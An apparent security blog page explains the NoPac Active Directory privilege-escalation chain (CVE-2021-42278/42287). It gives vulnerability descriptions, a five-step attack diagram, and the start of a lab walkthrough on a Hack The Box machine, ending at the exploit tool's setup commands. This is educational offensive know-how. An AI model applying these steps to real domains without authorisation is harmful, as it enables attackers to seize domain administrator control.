<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.136.2">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287 |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287 -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
                        
                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
                        
                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
                        
                            Resolute HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
                        
                            Fuse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Tools </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
                        
                            BloodServer: A Secure File Transfer Tool for Penetration Testers
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
                        
                            LDAPire: LDAP Enumeration Tool
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
                        
                            Attacking LDAP: Deep Dive &amp; Cheatsheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            Attacking RPC: Deep Dive &amp; Cheat Sheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/path/to/ldap-cheatsheet/" title="./cheatsheets/path/to/ldap-cheatsheet/">
                        
                            
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.21.10"
                            >2024.21.10
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        9 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/active-directory/"
                            class="tag-btn">
                            Active Directory
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/nopac/"
                            class="tag-btn">
                            NoPac
                        </a>
                    
                        <a
                            href="/tags/cve-2021-42278/"
                            class="tag-btn">
                            CVE-2021-42278
                        </a>
                    
                        <a
                            href="/tags/cve-2021-42287/"
                            class="tag-btn">
                            CVE-2021-42287
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/articles/" class="bread-btn">
    

    
        Articles
    
</a>




    /



<a href="http://localhost:1313/articles/understandingnopacexploit/" class="bread-btn">
    

    
        
            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction:</a></li>
    <li><a href="#understanding-the-vulnerabilities">Understanding the Vulnerabilities:</a>
      <ul>
        <li><a href="#cve-2021-42278-sam-bypass-vulnerability">CVE-2021-42278: SAM Bypass Vulnerability:</a></li>
        <li><a href="#cve-2021-42287-kerberos-pac-vulnerability">CVE-2021-42287: Kerberos PAC Vulnerability:</a></li>
      </ul>
    </li>
    <li><a href="#the-nopac-exploit-process">The NoPac Exploit Process:</a>
      <ul>
        <li><a href="#step-1-initial-access">Step 1: Initial Access</a></li>
        <li><a href="#step-2-exploiting-cve-2021-42278">Step 2: Exploiting CVE-2021-42278:</a></li>
        <li><a href="#step-3-requesting-a-tgt">Step 3: Requesting a TGT:</a></li>
        <li><a href="#step-4-exploiting-cve-2021-42287">Step 4: Exploiting CVE-2021-42287:</a></li>
        <li><a href="#step-5-privilege-escalation">Step 5: Privilege Escalation:</a></li>
      </ul>
    </li>
    <li><a href="#real-world-exploitation-example">Real-World Exploitation Example:</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites:</a></li>
        <li><a href="#step-by-step-exploitation">Step-by-Step Exploitation:</a></li>
        <li><a href="#2-dot-enumerate-to-find-out-if-the-target-is-vulnerable-to-the-nopac-exploit">2. Enumerate to find out if the target is vulnerable to the NoPac Exploit:</a></li>
        <li><a href="#3-dot-execute-the-exploit">3. Execute the Exploit:</a></li>
        <li><a href="#4-dot-verify-privilege-escalation">4. Verify Privilege Escalation:</a></li>
        <li><a href="#5-dot-post-exploitation">5. Post-Exploitation:</a></li>
      </ul>
    </li>
    <li><a href="#defending-against-nopac-attacks">Defending Against NoPac Attacks:</a></li>
    <li><a href="#conclusion">Conclusion:</a></li>
    <li><a href="#further-reading">Further Reading:</a></li>
    <li><a href="#frequently-asked-questions">Frequently Asked Questions:</a>
      <ul>
        <li><a href="#q-how-quickly-should-organizations-patch-for-nopac-vulnerabilities">Q: How quickly should organizations patch for NoPac vulnerabilities?</a></li>
        <li><a href="#q-can-nopac-be-exploited-remotely">Q: Can NoPac be exploited remotely?</a></li>
        <li><a href="#q-are-there-any-signs-that-might-indicate-a-nopac-attack-has-occurred">Q: Are there any signs that might indicate a NoPac attack has occurred?</a></li>
        <li><a href="#q-can-nopac-be-mitigated-without-applying-patches">Q: Can NoPac be mitigated without applying patches?</a></li>
        <li><a href="#q-how-does-nopac-compare-to-other-active-directory-exploits">Q: How does NoPac compare to other Active Directory exploits?</a></li>
      </ul>
    </li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="introduction">Introduction:</h2>
<p>In late 2021 the &ldquo;NoPac&rdquo; exploit leveraged two critical vulnerabilities in Microsoft&rsquo;s Active Directory, potentially allowing an attacker to escalate from a standard user account to domain administrator privileges with alarming ease.</p>
<p><strong>Key Points</strong>:</p>
<ul>
<li>NoPac exploits two vulnerabilities: CVE-2021-42278 and CVE-2021-42287</li>
<li>It allows privilege escalation from a standard user to domain admin</li>
<li>Understanding this exploit is crucial for system administrators and security professionals</li>
</ul>
<p>Let&rsquo;s delve into the intricacies of NoPac, exploring the underlying vulnerabilities, mechanics, and the significant threat it posed to organizational security.</p>
<h2 id="understanding-the-vulnerabilities">Understanding the Vulnerabilities:</h2>
<p>At its core, the NoPac exploit takes advantage of two distinct but interrelated vulnerabilities in Microsoft&rsquo;s Active Directory. Let&rsquo;s examine each in detail:</p>
<h3 id="cve-2021-42278-sam-bypass-vulnerability">CVE-2021-42278: SAM Bypass Vulnerability:</h3>
<p>The first vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42278">CVE-2021-42278</a>, is a bypass vulnerability in the Security Account Manager (SAM).</p>
<p><strong>Key Characteristics</strong>:</p>
<ul>
<li>Allows an attacker to manipulate the <code>SamAccountName</code> of a computer account.</li>
<li>Enables changing a computer account name to match that of a Domain Controller.</li>
<li>Exploits a flaw in how Active Directory handles computer account naming&gt;</li>
</ul>
<p><strong>Impact</strong>:</p>
<ul>
<li>Creates confusion in the domain&rsquo;s naming structure.</li>
<li>Sets the stage for the second part of the exploit.</li>
</ul>
<h3 id="cve-2021-42287-kerberos-pac-vulnerability">CVE-2021-42287: Kerberos PAC Vulnerability:</h3>
<p>The second vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42287">CVE-2021-42287</a>, resides within the Kerberos Privilege Attribute Certificate (PAC) in Active Directory Domain Services (AD DS).</p>
<p><strong>Key Characteristics</strong>:</p>
<ul>
<li>Allows manipulation of Kerberos ticket issuance</li>
<li>Exploits how the Key Distribution Center (KDC) handles service ticket requests</li>
</ul>
<p><strong>Impact</strong>:</p>
<ul>
<li>Enables an attacker to obtain a service ticket for a Domain Controller</li>
<li>When combined with <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42278">CVE-2021-42278</a>, leads to privilege escalation</li>
</ul>
<h2 id="the-nopac-exploit-process">The NoPac Exploit Process:</h2>
<p>To better understand the flow of the NoPac exploit, let&rsquo;s look at a simplified diagram of the process:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="&#43;--------------------------------------------------&#43;%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%201.%20Initial%20Access%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Standard%20domain%20user%20credentials%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%202.%20Exploit%20CVE-2021-42278%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Change%20computer%20account%20name%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Match%20Domain%20Controller%20name%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%203.%20Request%20TGT%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20For%20the%20renamed%20computer%20account%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%204.%20Exploit%20CVE-2021-42287%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Request%20service%20ticket%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20KDC%20issues%20ticket%20for%20DC%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%205.%20Privilege%20Escalation%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Obtain%20Domain%20Admin%20privileges%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a&#43;--------------------------------------------------&#43;">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>+--------------------------------------------------+
</span></span><span style="display:flex;"><span>|                                                  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  1. Initial Access                         |  |
</span></span><span style="display:flex;"><span>|  |     - Standard domain user credentials     |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                       |                          |
</span></span><span style="display:flex;"><span>|                       v                          |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  2. Exploit CVE-2021-42278                 |  |
</span></span><span style="display:flex;"><span>|  |     - Change computer account name         |  |
</span></span><span style="display:flex;"><span>|  |     - Match Domain Controller name         |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                       |                          |
</span></span><span style="display:flex;"><span>|                       v                          |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  3. Request TGT                            |  |
</span></span><span style="display:flex;"><span>|  |     - For the renamed computer account     |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                       |                          |
</span></span><span style="display:flex;"><span>|                       v                          |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  4. Exploit CVE-2021-42287                 |  |
</span></span><span style="display:flex;"><span>|  |     - Request service ticket               |  |
</span></span><span style="display:flex;"><span>|  |     - KDC issues ticket <span style="color:#66d9ef">for</span> DC             |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                       |                          |
</span></span><span style="display:flex;"><span>|                       v                          |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  5. Privilege Escalation                   |  |
</span></span><span style="display:flex;"><span>|  |     - Obtain Domain Admin privileges       |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                                                  |
</span></span><span style="display:flex;"><span>+--------------------------------------------------+</span></span></code></pre></div>
    
</div>
<p>This diagram outlines the five main steps an attacker would typically follow when exploiting NoPac. Let&rsquo;s dive deeper into each step.</p>
<h3 id="step-1-initial-access">Step 1: Initial Access</h3>
<p>The attack begins with standard domain user credentials. It&rsquo;s crucial to note that by default, authenticated users can add up to 10 computers to a domain, which is a key factor in this exploit.</p>
<h3 id="step-2-exploiting-cve-2021-42278">Step 2: Exploiting CVE-2021-42278:</h3>
<p>The attacker leverages CVE-2021-42278 to change the name of a new computer account to match a Domain Controller&rsquo;s SamAccountName. This step exploits the vulnerability in how Active Directory handles computer account naming.</p>
<h3 id="step-3-requesting-a-tgt">Step 3: Requesting a TGT:</h3>
<p>With the renamed computer account, the attacker requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC).</p>
<h3 id="step-4-exploiting-cve-2021-42287">Step 4: Exploiting CVE-2021-42287:</h3>
<p>The attacker then exploits CVE-2021-42287 by requesting a service ticket. Due to the vulnerability in the Kerberos PAC, the KDC issues a ticket for the Domain Controller.</p>
<h3 id="step-5-privilege-escalation">Step 5: Privilege Escalation:</h3>
<p>With the obtained service ticket for the Domain Controller, the attacker can now escalate their privileges to Domain Admin level, effectively compromising the entire domain.</p>
<h2 id="real-world-exploitation-example">Real-World Exploitation Example:</h2>
<p>To better understand how the NoPac exploit works in practice, let&rsquo;s walk through a real-world example. This demonstration will show each step of the process, from initial access to achieving domain admin privileges.</p>
<ul>
<li>This attack was performed on the Hack The Box machine Resolute:
<ul>
<li><a href="https://app.hackthebox.com/machines/Resolute">https://app.hackthebox.com/machines/Resolute</a></li>
<li>My walkthrough is available here:
<ul>
<li><a href="https://bloodstiller.com/walkthroughs/resolute-box/">https://bloodstiller.com/walkthroughs/resolute-box/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="prerequisites">Prerequisites:</h3>
<p><strong>Before we begin, ensure you have the following</strong>:</p>
<ul>
<li>A vulnerable Windows domain environment (pre-patch for CVE-2021-42278 and CVE-2021-42287)</li>
<li>Standard domain user credentials</li>
<li>Access to a machine joined to the domain</li>
<li>The NoPac exploit &amp; python installed:
<ul>
<li><a href="https://github.com/Ridter/noPac.git">https://github.com/Ridter/noPac.git</a></li>
</ul>
</li>
</ul>
<h3 id="step-by-step-exploitation">Step-by-Step Exploitation:</h3>
<h4 id="1-prepare-the-exploit">1 - Prepare the Exploit:</h4>
<ul>
<li>
<p><strong>Create Python Virtual Environment</strong>:</p>
<ul>
<li>I prefer to use python venvs when using exploits this way I don&rsquo;t mess with my underlying python install and everything can existing in it&rsquo;s own space with it&rsquo;s own dependencies</li>
<li><code>cd noPac</code></li>
<li><code>python3 -m venv noPac</code></li>
</ul>
</li>
<li>
<p><strong>Activate Venv</strong>:</p>
<ul>
<li><code>source noPac/bin/activate</code></li>
</ul>
</li>
<li>
<p><strong>Install Dependencies</strong>:</p>
<ul>
<li><code>pip3 install -r requirements</code></li>
</ul>
</li>
</ul>
